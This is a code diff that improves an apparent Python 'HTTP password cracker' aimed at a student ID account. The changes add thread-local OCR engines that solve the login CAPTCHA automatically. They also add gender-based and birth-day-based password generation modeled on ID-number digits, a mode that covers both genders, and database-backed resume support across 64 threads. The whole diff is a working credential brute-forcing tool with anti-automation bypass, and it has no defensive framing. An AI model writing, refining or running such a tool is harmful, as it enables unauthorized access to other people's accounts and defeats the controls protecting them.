@@ -38,9 +38,20 @@ logger = logging.getLogger("HTTP_Cracker")
 
 # Global control flags
 stop_event = threading.Event()
-ocr_lock = threading.Lock()
-ocr_engine = None
+
+# ocr_lock removed - using thread-local
 progress_queue = queue.Queue()
+
+# Thread-local storage for OCR engines
+thread_local = threading.local()
+
+
+def get_ocr_engine():
+    """Get or create a thread-local OCR engine"""
+    if not hasattr(thread_local, "engine"):
+        # Initialize one engine per thread
+        thread_local.engine = ddddocr.DdddOcr(show_ad=False, old=True)
+    return thread_local.engine
 
 
 # ================= Database Functions =================
@@ -122,15 +133,22 @@ def db_updater_loop():
     pending_updates = {}  # (username, day) -> password
     last_commit = time.time()
 
-    while not stop_event.is_set():
+    while True:
         try:
             try:
                 # Wait for items, but timeout quickly to check stop_event and commit interval
                 item = progress_queue.get(timeout=0.5)
                 username, day, password = item
-                pending_updates[(username, day)] = password
+
+                # High-water mark logic: only update if password is lexically larger
+                # This prevents regression in progress if threads finish out of order
+                key = (username, day)
+                if key not in pending_updates or password > pending_updates[key]:
+                    pending_updates[key] = password
+
             except queue.Empty:
-                pass
+                if stop_event.is_set():
+                    break
 
             # Commit if batch is large enough or time has passed
             current_time = time.time()
@@ -151,6 +169,9 @@ def db_updater_loop():
                         data,
                     )
                     conn.commit()
+                    logger.info(
+                        f"Saved progress for {len(pending_updates)} items to DB."
+                    )
                     pending_updates.clear()
                     last_commit = current_time
                 except Exception as e:
@@ -176,6 +197,7 @@ def db_updater_loop():
                 data,
             )
             conn.commit()
+            logger.info("Final progress save completed.")
         except Exception:
             pass
     conn.close()
@@ -243,13 +265,9 @@ def solve_captcha(sess):
 
         img_bytes = base64.b64decode(img_b64)
 
-        # Thread-safe OCR
-        with ocr_lock:
-            engine = ocr_engine
-            if engine is None:
-                engine = ddddocr.DdddOcr(show_ad=False, old=True)
-                globals()['ocr_engine'] = engine
-            code = engine.classification(img_bytes)
+        # Thread-local OCR
+        engine = get_ocr_engine()
+        code = engine.classification(img_bytes)
 
         return captcha_id, code
 
@@ -325,27 +343,55 @@ def generate_passwords(gender="M", specific_day=None, progress_map=None):
         progress_map = {}
 
     days = [specific_day] if specific_day else [f"{d:02d}" for d in range(1, 32)]
-    target_remainder = 1 if gender.upper() == "M" else 0
 
-    for dd in days:
-        resume_pw = progress_map.get(dd)
-        skipping = True if resume_pw else False
+    if gender.upper() == "ALL":
+        target_genders = ["M", "F"]
+    else:
+        target_genders = [gender.upper()]
 
-        for seq in range(1000):
-            if seq % 2 != target_remainder:
-                continue
+    for g in target_genders:
+        target_remainder = 1 if g == "M" else 0
 
-            sss = f"{seq:03d}"
-            for check in range(10):
-                c = str(check)
-                password = f"{dd}{sss}{c}"
+        for dd in days:
+            # Key format: Gender_Day (e.g. M_30)
+            day_key = f"{g}_{dd}"
 
-                if skipping:
-                    if password == resume_pw:
-                        skipping = False
+            resume_pw = progress_map.get(day_key)
+
+            # Try legacy key lookup (e.g. "30") if specific key not found
+            if not resume_pw:
+                legacy_pw = progress_map.get(dd)
+                if legacy_pw:
+                    try:
+                        # Check if legacy password matches current gender
+                        if int(legacy_pw[4]) % 2 == target_remainder:
+                            resume_pw = legacy_pw
+                            logger.info(
+                                f"[*] Day {dd} ({g}): Found legacy progress {resume_pw}"
+                            )
+                    except (IndexError, ValueError):
+                        pass
+
+            skipping = False
+            if resume_pw:
+                skipping = True
+                logger.info(f"[*] Day {day_key}: Resuming from {resume_pw}")
+
+            for seq in range(1000):
+                if seq % 2 != target_remainder:
                     continue
 
-                yield password, dd
+                sss = f"{seq:03d}"
+                for check in range(10):
+                    c = str(check)
+                    password = f"{dd}{sss}{c}"
+
+                    if skipping:
+                        if password == resume_pw:
+                            skipping = False
+                        continue
+
+                    yield password, day_key
 
 
 # ================= Worker Function =================
@@ -392,32 +438,26 @@ def worker(username, password, day_prefix):
             time.sleep(0.5)
             continue
 
-    # If we exhausted retries, we might skip this password (risky)
-    # or just return.
-    # logger.warning(f"❌ Exhausted retries for {password}")
 
-
-# ================= Main =================
 def main():
-    global ocr_engine
-
     parser = argparse.ArgumentParser(
         description="High-Performance HTTP Password Cracker"
     )
     parser.add_argument("username", help="Target Student ID")
     parser.add_argument(
-        "--gender", "-g", choices=["M", "F"], default="M", help="Gender (M/F)"
+        "--gender",
+        "-g",
+        choices=["M", "F", "ALL"],
+        default="ALL",
+        help="Gender (M/F/ALL)",
     )
     parser.add_argument("--day", "-d", help="Specific day (01-31)")
+
     parser.add_argument(
         "--threads", "-t", type=int, default=64, help="Number of threads (default: 64)"
     )
 
     args = parser.parse_args()
-
-    # Init OCR
-    logger.info("Loading OCR engine...")
-    ocr_engine = ddddocr.DdddOcr(show_ad=False, old=True)
 
     # Init DB
     conn = init_db()
@@ -435,10 +475,14 @@ def main():
         return
 
     progress = get_progress_map(conn, args.username)
+    if progress:
+        logger.info(f"[*] Resuming: Found progress for {len(progress)} days.")
+    else:
+        logger.info("[*] No saved progress found. Starting from scratch.")
     conn.close()
 
-    # Start DB Updater Thread
-    db_thread = threading.Thread(target=db_updater_loop, daemon=True)
+    # Start DB Updater Thread (non-daemon to ensure cleanup)
+    db_thread = threading.Thread(target=db_updater_loop, daemon=False)
     db_thread.start()
 
     # Generate password list
@@ -449,6 +493,9 @@ def main():
 
     if total_tasks == 0:
         logger.info("No passwords to test (Check filters or previous progress).")
+        # Ensure DB thread closes if we return early
+        stop_event.set()
+        db_thread.join()
         return
 
     logger.info(
@@ -459,8 +506,10 @@ def main():
     start_time = time.time()
 
     # Executor
-    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-        futures = []
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)
+    futures = []
+
+    try:
         try:
             for pwd, day in tasks:
                 if stop_event.is_set():
@@ -476,7 +525,6 @@ def main():
         try:
             for _ in concurrent.futures.as_completed(futures):
                 if stop_event.is_set():
-                    executor.shutdown(wait=False, cancel_futures=True)
                     break
 
                 completed += 1
@@ -490,7 +538,17 @@ def main():
         except KeyboardInterrupt:
             logger.info("\nStopping...")
             stop_event.set()
-            executor.shutdown(wait=False)
+
+    finally:
+        if stop_event.is_set():
+            executor.shutdown(wait=False, cancel_futures=True)
+        else:
+            executor.shutdown(wait=True)
+
+    # Ensure DB thread finishes
+    stop_event.set()
+    logger.info("Waiting for database sync...")
+    db_thread.join()
 
     print()  # Newline
     duration = time.time() - start_time
